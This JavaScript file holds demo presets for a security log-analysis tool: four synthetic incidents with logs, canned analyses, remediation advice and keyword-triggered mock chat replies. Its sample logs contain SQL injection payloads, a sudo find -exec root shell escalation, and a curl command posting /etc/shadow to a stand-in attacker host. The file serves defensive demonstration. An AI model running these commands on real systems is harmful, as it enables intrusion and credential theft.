// Predefined logs and analysis reports for Splunk Sentinel Demo Mode

export const PRESETS = {
  bruteForce: {
    name: "SSH Brute Force Attack",
    description: "Multiple failed authentication attempts followed by a successful login and sudo execution.",
    severity: "critical",
    threatType: "Credential Bruteforcing & Account Compromise",
    logs: `Jun 15 14:20:01 auth-srv-01 sshd[12450]: Failed password for invalid user admin from 198.51.100.42 port 49218 ssh2
Jun 15 14:20:05 auth-srv-01 sshd[12452]: Failed password for invalid user admin from 198.51.100.42 port 49222 ssh2
Jun 15 14:20:10 auth-srv-01 sshd[12454]: Failed password for invalid user admin from 198.51.100.42 port 49226 ssh2
Jun 15 14:20:15 auth-srv-01 sshd[12458]: Failed password for invalid user admin from 198.51.100.42 port 49230 ssh2
Jun 15 14:20:21 auth-srv-01 sshd[12462]: Failed password for invalid user admin from 198.51.100.42 port 49234 ssh2
Jun 15 14:20:30 auth-srv-01 sshd[12470]: Failed password for invalid user root from 198.51.100.42 port 49240 ssh2
Jun 15 14:20:35 auth-srv-01 sshd[12472]: Failed password for invalid user root from 198.51.100.42 port 49244 ssh2
Jun 15 14:20:41 auth-srv-01 sshd[12476]: Failed password for invalid user operator from 198.51.100.42 port 49248 ssh2
Jun 15 14:21:02 auth-srv-01 sshd[12480]: Failed password for user devops from 198.51.100.42 port 49254 ssh2
Jun 15 14:21:15 auth-srv-01 sshd[12488]: Failed password for user devops from 198.51.100.42 port 49260 ssh2
Jun 15 14:21:30 auth-srv-01 sshd[12492]: Failed password for user devops from 198.51.100.42 port 49266 ssh2
Jun 15 14:21:58 auth-srv-01 sshd[12502]: Accepted password for user devops from 198.51.100.42 port 49280 ssh2
Jun 15 14:22:05 auth-srv-01 sshd[12502]: pam_unix(sshd:session): session opened for user devops by (uid=0)
Jun 15 14:22:15 auth-srv-01 sudo[12510]: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/usr/bin/apt-get update
Jun 15 14:22:30 auth-srv-01 sudo[12518]: devops : TTY=pts/0 ; PWD=/home/devops ; USER=root ; COMMAND=/bin/bash
Jun 15 14:22:32 auth-srv-01 sudo[12518]: pam_unix(sudo:session): session opened for user root by (uid=0)`,
    analysis: {
      severity: "critical",
      threatType: "Credential Bruteforcing & Account Compromise",
      rootCause: "An external attacker at IP 198.51.100.42 targeted the server 'auth-srv-01' using a dictionary password attack against common users (admin, root, operator) before successfully guessing the password for user 'devops'. Immediately after authentication, the attacker spawned an interactive root bash shell (/bin/bash) via sudo, achieving full host compromise.",
      summary: "External entity conducted a successful SSH brute-force attack against host auth-srv-01, compromising the devops account and escalating privileges to root within 2.5 minutes.",
      keyArtifacts: {
        sourceIps: ["198.51.100.42"],
        targetSystems: ["auth-srv-01"],
        affectedUsers: ["devops", "root (compromised)", "admin (targeted)", "operator (targeted)"],
        signatures: ["sshd: Failed password", "sshd: Accepted password", "sudo: COMMAND=/bin/bash"]
      },
      recommendedActions: [
        "Immediately revoke session for user 'devops' and terminate PID 12518.",
        "Disable password authentication in /etc/ssh/sshd_config (enforce SSH Keys only).",
        "Temporarily block source IP address 198.51.100.42 on the perimeter firewall.",
        "Force password rotation and audit SSH authorized_keys for the 'devops' account.",
        "Configure fail2ban or equivalent IPS to automatically block hosts with >5 failed logins."
      ],
      timeline: [
        { time: "14:20:01", event: "Attack Start", details: "Initial failed login attempt targeting user 'admin' from IP 198.51.100.42." },
        { time: "14:20:30", event: "Target Shift", details: "Attacker shifts targets to administrative accounts 'root' and 'operator'." },
        { time: "14:21:02", event: "Targeting DevOps", details: "Attacker begins targeting user 'devops', generating 3 failed passwords." },
        { time: "14:21:58", event: "Compromise", details: "Attacker guesses correct password for 'devops' and establishes active session." },
        { time: "14:22:30", event: "Privilege Escalation", details: "User 'devops' executes sudo to run /bin/bash, gaining full root privileges." }
      ]
    },
    chatResponses: [
      { trigger: "root", response: "The logs show the user 'devops' executed `/bin/bash` under sudo at 14:22:30, triggering a session open for user root. This means the attacker obtained full administrative privileges on the server." },
      { trigger: "ip", response: "The source IP address is `198.51.100.42`. It appears to be an external address responsible for all failed logon attempts and the final successful compromise." },
      { trigger: "prevent", response: "To prevent this, you should disable password authentication in SSH, require SSH keys, set up multi-factor authentication, and install an IP rate-limiting utility like fail2ban." },
      { trigger: "default", response: "Sentinel analysis indicates a successful SSH brute-force attack originating from 198.51.100.42. The attacker guessed the credentials for user 'devops' and immediately escalated privileges to root. I suggest blocking the IP and resetting user keys." }
    ]
  },

  sqlInjection: {
    name: "Web Application SQL Injection",
    description: "Nginx web access logs showing SQL injection payloads and database syntax error responses.",
    severity: "high",
    threatType: "SQL Injection (SQLi) & Data Reconnaissance",
    logs: `2026-06-15T15:10:02Z 203.0.113.88 GET /api/v1/products?category=hardware HTTP/1.1 200 1204 "Mozilla/5.0"
2026-06-15T15:10:15Z 203.0.113.88 GET /api/v1/products?category=hardware%27%20OR%201%3D1-- HTTP/1.1 200 45892 "Mozilla/5.0"
2026-06-15T15:10:30Z 203.0.113.88 GET /api/v1/products?category=hardware%27%20UNION%20SELECT%20null,username,password%20FROM%20users-- HTTP/1.1 500 89 "Mozilla/5.0"
2026-06-15T15:10:32Z DB-SERVER-01 postgresql[3829]: ERROR: SELECT to relation "users" does not exist at character 38
2026-06-15T15:10:45Z 203.0.113.88 GET /api/v1/products?category=hardware%27%20UNION%20SELECT%20null,user_name,password_hash%20FROM%20accounts-- HTTP/1.1 200 2480 "Mozilla/5.0"
2026-06-15T15:11:00Z 203.0.113.88 GET /api/v1/products?category=hardware%27%20UNION%20SELECT%20null,null,pg_sleep(10)-- HTTP/1.1 200 450 "Mozilla/5.0"
2026-06-15T15:11:15Z DB-SERVER-01 postgresql[3830]: STATEMENT: SELECT name, desc FROM products WHERE category = 'hardware' UNION SELECT null,null,pg_sleep(10)--
2026-06-15T15:11:30Z 203.0.113.88 GET /api/v1/admin/exports?table=accounts&format=json HTTP/1.1 200 89201 "Mozilla/5.0"`,
    analysis: {
      severity: "high",
      threatType: "SQL Injection (SQLi) & Data Reconnaissance",
      rootCause: "The web application endpoint `/api/v1/products` failed to sanitize input parameter `category`. An attacker at IP 203.0.113.88 exploited this vulnerability by inserting SQL payloads (`UNION SELECT` and `pg_sleep`) to query the underlying PostgreSQL database. The attacker mapped out database column structures, found the user table `accounts`, extracted credentials (`user_name` and `password_hash`), and then leveraged an admin export route to download the database tables.",
      summary: "SQL Injection vulnerability on web application was successfully exploited by 203.0.113.88, leading to database schema mapping, table enumeration, and database backup exfiltration.",
      keyArtifacts: {
        sourceIps: ["203.0.113.88"],
        targetSystems: ["Web Gateway", "DB-SERVER-01 (PostgreSQL)"],
        affectedUsers: ["PostgreSQL App Connection", "Admin portal account"],
        signatures: ["UNION SELECT", "pg_sleep(10)", "OR 1=1", "postgresql ERROR:relation does not exist"]
      },
      recommendedActions: [
        "Implement parameterized queries or use an ORM for query construction in `/api/v1/products`.",
        "Deploy Web Application Firewall (WAF) rules targeting SQL injection patterns (e.g. UNION/SELECT regex).",
        "Enable database query parameter validation and restrict application DB user privileges (least privilege).",
        "Block IP 203.0.113.88 immediately at the application gateway / load balancer.",
        "Audit the `/api/v1/admin/exports` endpoint access control - verify why the unauthorized user could invoke it."
      ],
      timeline: [
        { time: "15:10:02", event: "Reconnaissance", details: "Attacker issues standard HTTP request to inspect system behavior." },
        { time: "15:10:15", event: "SQLi Probe", details: "Attacker attempts simple tautology probe `' OR 1=1--` to bypass category filtering." },
        { time: "15:10:30", event: "Error Injection", details: "Attacker injects UNION SELECT to query user table, triggering database schema mismatch error." },
        { time: "15:10:45", event: "Data Leak", details: "Attacker successfully guesses correct table name `accounts` and retrieves credentials." },
        { time: "15:11:30", event: "Exfiltration", details: "Attacker calls backend admin export file, pulling down the full accounts table (89KB JSON)." }
      ]
    },
    chatResponses: [
      { trigger: "ip", response: "The attacker IP is `203.0.113.88`. It made multiple requests targeting `/api/v1/products` with SQL syntax injections." },
      { trigger: "database", response: "The database backend is PostgreSQL running on host `DB-SERVER-01`. The logs capture active syntax errors and SQL statement executions directly inside Postgres." },
      { trigger: "fix", response: "To resolve SQL injection, use prepared statements (parameterized queries) in your code, ensure you validate inputs against strict schemas, and block common SQL keyword patterns using a WAF." },
      { trigger: "default", response: "Sentinel identified an active SQL injection attack on `/api/v1/products` parameter `category`. The attacker successfully mapped the PostgreSQL schema and downloaded account databases. parameterization is needed immediately." }
    ]
  },

  privilegeEscalation: {
    name: "Linux Privilege Escalation",
    description: "System secure log entries highlighting a regular service account executing suspicious sudo commands and acquiring root shell.",
    severity: "high",
    threatType: "Local Privilege Escalation (LPE)",
    logs: `Jun 15 16:05:01 web-server-02 systemd[1]: Started Session 128 of user www-data.
Jun 15 16:05:15 web-server-02 webshell.php[892]: Executing incoming shell command: whoami
Jun 15 16:05:16 web-server-02 webshell.php[892]: Output: www-data
Jun 15 16:05:30 web-server-02 webshell.php[892]: Executing: find / -perm -4000 -type f 2>/dev/null
Jun 15 16:05:45 web-server-02 webshell.php[892]: Executing: sudo -l
Jun 15 16:05:46 web-server-02 webshell.php[892]: Output: User www-data may run the following commands on web-server-02:
Jun 15 16:05:46 web-server-02 webshell.php[892]:         (root) NOPASSWD: /usr/bin/find
Jun 15 16:06:01 web-server-02 webshell.php[892]: Executing: sudo /usr/bin/find . -exec /bin/sh -i \;
Jun 15 16:06:01 web-server-02 sudo[905]: www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/find . -exec /bin/sh -i ;
Jun 15 16:06:02 web-server-02 sudo[905]: pam_unix(sudo:session): session opened for user root by (uid=0)
Jun 15 16:06:15 web-server-02 root-shell[906]: Executing root command: cat /etc/shadow > /var/www/html/assets/shadow_dump.txt
Jun 15 16:06:30 web-server-02 root-shell[906]: Executing root command: curl -X POST -d @/etc/shadow http://attacker-controlled-c2.net/leak`,
    analysis: {
      severity: "high",
      threatType: "Local Privilege Escalation (LPE) & Exfiltration",
      rootCause: "A compromised web application allowed the upload of a PHP web shell (`webshell.php`). The attacker used the web shell to execute shell commands as the low-privilege service account `www-data`. The attacker queried SUID files and sudo permissions (`sudo -l`), discovering a misconfiguration: `www-data` was permitted to run `/usr/bin/find` as root without a password. The attacker abused this privilege using GTFOBins techniques (`find -exec`) to spawn an interactive root shell, subsequently dumping the system password hashes (`/etc/shadow`) and exfiltrating them to a remote server.",
      summary: "Local privilege escalation achieved on web-server-02 via misconfigured passwordless sudo permission on '/usr/bin/find', resulting in compromise of root and exfiltration of hash files.",
      keyArtifacts: {
        sourceIps: ["attacker-controlled-c2.net (C2 server)"],
        targetSystems: ["web-server-02"],
        affectedUsers: ["www-data (initially compromised)", "root (fully compromised)"],
        signatures: ["webshell.php", "sudo -l", "sudo /usr/bin/find . -exec /bin/sh", "/etc/shadow exfiltration"]
      },
      recommendedActions: [
        "Delete the file `/var/www/html/webshell.php` immediately and scan the web directory for backdoors.",
        "Modify the `/etc/sudoers` file to remove the NOPASSWD directive for `/usr/bin/find`.",
        "Kill all running processes associated with PID 892, 905, and 906.",
        "Delete the exfiltrated file backup in `/var/www/html/assets/shadow_dump.txt`.",
        "Change the passwords/hashes for all local users since `/etc/shadow` was exfiltrated.",
        "Configure system hardening rules to restrict the webserver user from spawning interactive shells."
      ],
      timeline: [
        { time: "16:05:01", event: "Webshell Active", details: "Incoming HTTP requests trigger command execution through webshell.php." },
        { time: "16:05:30", event: "Reconnaissance", details: "Attacker lists SUID files and inspects sudo capabilities, finding the find wildcard." },
        { time: "16:06:01", event: "Privilege Escalation", details: "Attacker executes sudo find with exec shell hook, launching shell as uid=0 (root)." },
        { time: "16:06:15", event: "Cred Dumping", details: "Attacker dumps the encrypted password shadows to public asset folder." },
        { time: "16:06:30", event: "Exfiltration", details: "Attacker curls shadow entries to external Command & Control IP." }
      ]
    },
    chatResponses: [
      { trigger: "find", response: "The attacker used a known GTFOBins vulnerability where `/usr/bin/find` has passwordless sudo permission. By running `find . -exec /bin/sh -i \\;`, the find command executed an interactive shell which inherited the root execution context." },
      { trigger: "webshell", response: "The entry point was `webshell.php` located in `/var/www/html`. This file was uploaded to the server, allowing remote command execution as the `www-data` user." },
      { trigger: "shadow", response: "The attacker read `/etc/shadow` (which contains system password hashes), saved it to `/var/www/html/assets/shadow_dump.txt`, and exfiltrated it to `attacker-controlled-c2.net`." },
      { trigger: "default", response: "The logs confirm local privilege escalation. The attacker leveraged a webshell to escalate from `www-data` to `root` via a sudo misconfiguration in the `find` binary, followed by shadow file theft. Clean the webshell and restrict sudo access." }
    ]
  },

  suspiciousAuth: {
    name: "Impossible Travel Detection",
    description: "Active Directory & identity access logs showing a single user account authenticating from two distant geographical locations within a 15-minute window.",
    severity: "medium",
    threatType: "Credential Abuse & Impossible Travel",
    logs: `2026-06-15T13:45:00Z AD-CONTROLLER-01 EventID=4624 User=alice@corp.com IP=198.51.100.10 Loc="New York, US" Status=SUCCESS Type=Workstation
2026-06-15T13:52:12Z Exchange-Mail-01 EventID=4624 User=alice@corp.com IP=198.51.100.10 Loc="New York, US" Status=SUCCESS Type=WebMail
2026-06-15T14:00:15Z AD-CONTROLLER-01 EventID=4624 User=alice@corp.com IP=203.0.113.102 Loc="London, UK" Status=SUCCESS Type=VPN
2026-06-15T14:01:30Z File-Share-01 EventID=4634 User=alice@corp.com IP=203.0.113.102 Loc="London, UK" Status=SUCCESS Type=Network Share Access
2026-06-15T14:02:10Z File-Share-01 EventID=4663 User=alice@corp.com ObjectName="D:\\CorpData\\Finance\\2026_Q2_Salaries.xlsx" Accesses=READ
2026-06-15T14:03:00Z File-Share-01 EventID=4663 User=alice@corp.com ObjectName="D:\\CorpData\\Strategy\\M_A_Targets.docx" Accesses=READ
2026-06-15T14:04:45Z AD-CONTROLLER-01 EventID=4625 User=alice@corp.com IP=203.0.113.102 Loc="London, UK" Status=FAILURE Reason="Password Expired"`,
    analysis: {
      severity: "medium",
      threatType: "Credential Abuse & Impossible Travel",
      rootCause: "The user account `alice@corp.com` authenticated successfully from New York, US at 13:45:00. Just 15 minutes later, at 14:00:15, the same user authenticated from London, UK via a VPN gateway. The geographical distance between New York and London (~3,500 miles) is physically impossible to traverse in 15 minutes. The secondary session from London was immediately utilized to map corporate file shares and access highly sensitive finance and strategy documents.",
      summary: "Impossible travel alert: alice@corp.com logged on from New York and London within 15 minutes. The session in London was used to access confidential payroll and strategy files, suggesting session hijacking or credential theft.",
      keyArtifacts: {
        sourceIps: ["198.51.100.10 (New York)", "203.0.113.102 (London)"],
        targetSystems: ["AD-CONTROLLER-01", "Exchange-Mail-01", "File-Share-01"],
        affectedUsers: ["alice@corp.com"],
        signatures: ["EventID=4624 (Logon Success)", "Impossible travel speed", "Access to sensitive shares"]
      },
      recommendedActions: [
        "Revoke all active tokens/sessions for `alice@corp.com` in Active Directory and Azure AD.",
        "Reset the password for user `alice@corp.com` and force re-registration of MFA devices.",
        "Block the suspicious IP `203.0.113.102` (London) on the firewall and VPN gateway.",
        "Quarantine workstation linked to IP `198.51.100.10` to scan for keyloggers or token-stealing malware.",
        "Verify if Alice is traveling or if she shared credentials/VPN configurations."
      ],
      timeline: [
        { time: "13:45:00", event: "US Logon", details: "Success logon from workstation in New York, US (Legitimate user IP)." },
        { time: "13:52:12", event: "Mail Access", details: "Alice accesses Exchange email from the same US workstation." },
        { time: "14:00:15", event: "UK VPN Logon", details: "Successful VPN logon from London, UK using valid credentials (Session compromise)." },
        { time: "14:02:10", event: "Sensitive Access", details: "Attacker accesses Q2 Salaries spreadsheet on file share server." },
        { time: "14:03:00", event: "Strategic Access", details: "Attacker opens mergers and acquisitions document on the same file share." }
      ]
    },
    chatResponses: [
      { trigger: "travel", response: "The 'impossible travel' anomaly is triggered because the user authenticated from New York, US and London, UK within 15 minutes. Travelling 3,500 miles in 15 minutes would require an average speed of 14,000 miles per hour, indicating credential sharing or token compromise." },
      { trigger: "alice", response: "Alice is the affected employee. Her account credentials or VPN sessions were compromised. The New York login is likely her true location, while the London VPN login is the malicious actor." },
      { trigger: "documents", response: "The compromised UK session accessed two sensitive files: `2026_Q2_Salaries.xlsx` (financial payroll data) and `M_A_Targets.docx` (strategic Mergers & Acquisitions documentation)." },
      { trigger: "default", response: "This incident is a classic Impossible Travel alert. Alice's credentials were used in the US and the UK simultaneously, accessing payroll and M&A data. I recommend disabling the account and rotating passwords." }
    ]
  }
};

// Fallback mock engine function to analyze logs if OpenAI key is missing or preset is matched
export function analyzeLogsMock(rawLogs) {
  const logsLower = rawLogs.toLowerCase();

  if (logsLower.includes("sshd") || logsLower.includes("brute") || logsLower.includes("failed password")) {
    return PRESETS.bruteForce.analysis;
  } else if (logsLower.includes("union select") || logsLower.includes("postgresql") || logsLower.includes("sql")) {
    return PRESETS.sqlInjection.analysis;
  } else if (logsLower.includes("webshell") || logsLower.includes("privilege") || logsLower.includes("sudo")) {
    return PRESETS.privilegeEscalation.analysis;
  } else if (logsLower.includes("impossible travel") || logsLower.includes("eventid=4624") || logsLower.includes("alice")) {
    return PRESETS.suspiciousAuth.analysis;
  }

  // Generic fallback if user pastes arbitrary text
  return {
    severity: "medium",
    threatType: "Anomalous Activity Log Detection",
    rootCause: "Sentinel heuristics detected suspicious syntax patterns or security identifiers in the provided logs. A system audit or event log sequence indicates abnormal activity that requires attention, though it does not match standard preset attack patterns.",
    summary: "Generic log analysis completed. Sentinel detected administrative event calls or networking packets that warrant validation.",
    keyArtifacts: {
      sourceIps: ["Detected in logs / Dynamic"],
      targetSystems: ["Host Systems"],
      affectedUsers: ["Service Account / System"],
      signatures: ["Generic Alert Pattern"]
    },
    recommendedActions: [
      "Isolate the affected network segments or nodes.",
      "Cross-examine events with Splunk SIEM alerts.",
      "Verify access rights for associated user entities.",
      "Review network firewall rules and enable verbose audit logging."
    ],
    timeline: [
      { time: "00:00:01", event: "Initial Marker", details: "First timeline occurrence detected in logs." },
      { time: "00:05:00", event: "Activity Shift", details: "Change in log density or log events." },
      { time: "00:10:00", event: "Alert Threshold", details: "Security alert triggers heuristics thresholds." }
    ]
  };
}

export function getMockChatResponse(rawLogs, userMessage) {
  const logsLower = rawLogs.toLowerCase();
  const msgLower = userMessage.toLowerCase();
  
  let responses = PRESETS.bruteForce.chatResponses;
  if (logsLower.includes("union select") || logsLower.includes("postgresql") || logsLower.includes("sql")) {
    responses = PRESETS.sqlInjection.chatResponses;
  } else if (logsLower.includes("webshell") || logsLower.includes("privilege") || logsLower.includes("sudo")) {
    responses = PRESETS.privilegeEscalation.chatResponses;
  } else if (logsLower.includes("impossible travel") || logsLower.includes("eventid=4624") || logsLower.includes("alice")) {
    responses = PRESETS.suspiciousAuth.chatResponses;
  }

  for (const item of responses) {
    if (msgLower.includes(item.trigger)) {
      return item.response;
    }
  }

  return responses.find(r => r.trigger === "default").response;
}
